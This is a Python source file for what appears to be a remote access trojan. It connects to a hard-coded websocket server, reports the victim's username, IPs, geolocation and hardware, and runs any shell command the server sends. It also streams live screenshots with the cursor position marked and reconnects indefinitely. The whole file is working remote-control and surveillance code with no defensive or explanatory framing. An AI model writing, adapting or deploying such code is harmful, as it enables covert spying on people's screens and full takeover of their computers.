import asyncio
import websockets
import subprocess
import uuid
import getpass
import io
import mss
import pyautogui
import socket
import platform
import psutil
import json
import requests
from PIL import Image, ImageDraw
import mss

try:
    import GPUtil
except:
    GPUtil = None

username = getpass.getuser()
client_id = f"{username}-{uuid.uuid4()}"
SERVER_URL = "wss://myman-w8p4.onrender.com/ws/client/"

screenshot_mode = False
jpeg_quality = 50
sleep_time = 0.03

def gather_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        hostname = "Unbekannt"
        local_ip = "Unbekannt"

    cpu_percent = psutil.cpu_percent(interval=None)
    ram = psutil.virtual_memory()
    ram_used = f"{ram.used // (1024 * 1024)} MB / {ram.total // (1024 * 1024)} MB"

    gpu_info = "Unbekannt"
    if GPUtil:
        gpus = GPUtil.getGPUs()
        if gpus:
            gpu_info = f"{gpus[0].name} ({gpus[0].load * 100:.1f}%)"

    public_ip = city = region = country = org = "Unbekannt"
    try:
        res = requests.get("https://ipapi.co/json", timeout=2)
        if res.status_code == 200:
            data = res.json()
            public_ip = data.get("ip", "Unbekannt")
            city = data.get("city", "Unbekannt")
            region = data.get("region", "Unbekannt")
            country = data.get("country_name", "Unbekannt")
            org = data.get("org", "Unbekannt")
    except:
        pass

    return {
        "hostname": hostname,
        "local_ip": local_ip,
        "cpu": f"{cpu_percent}%",
        "ram": ram_used,
        "gpu": gpu_info,
        "os": platform.platform(),
        "public_ip": public_ip,
        "city": city,
        "region": region,
        "country": country,
        "org": org
    }

async def screenshot_loop(ws):
    global screenshot_mode
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            if screenshot_mode:
                img = sct.grab(monitor)
                img_pil = Image.frombytes("RGB", img.size, img.rgb)
                x, y = pyautogui.position()
                x -= monitor["left"]
                y -= monitor["top"]
                draw = ImageDraw.Draw(img_pil)
                r = 10
                draw.ellipse((x-r, y-r, x+r, y+r), fill="red", outline="black", width=2)
                buf = io.BytesIO()
                img_pil.save(buf, format='JPEG', quality=jpeg_quality)
                asyncio.create_task(ws.send(buf.getvalue()))
                await asyncio.sleep(sleep_time)
            else:
                await asyncio.sleep(0.1)

async def message_loop(ws):
    global screenshot_mode
    while True:
        msg = await ws.recv()
        if msg == "screenshot_start":
            screenshot_mode = True
        elif msg == "screenshot_stop":
            screenshot_mode = False
        else:
            try:
                output = subprocess.check_output(msg, shell=True, text=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e)
            await ws.send(output)

async def heartbeat_loop(ws):
    while True:
        try:
            await ws.send("ping")
        except:
            break
        await asyncio.sleep(5)

async def run_client():
    while True:
        try:
            uri = f"{SERVER_URL}{client_id}"
            async with websockets.connect(uri, max_size=None) as ws:
                sysinfo = gather_system_info()
                await ws.send(json.dumps({"type": "client_info", "data": sysinfo}))
                await asyncio.gather(
                    message_loop(ws),
                    screenshot_loop(ws),
                    heartbeat_loop(ws)
                )
        except Exception as e:
            print(f"⚠️ Connection lost: {e}, retrying in 5 sec...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(run_client())
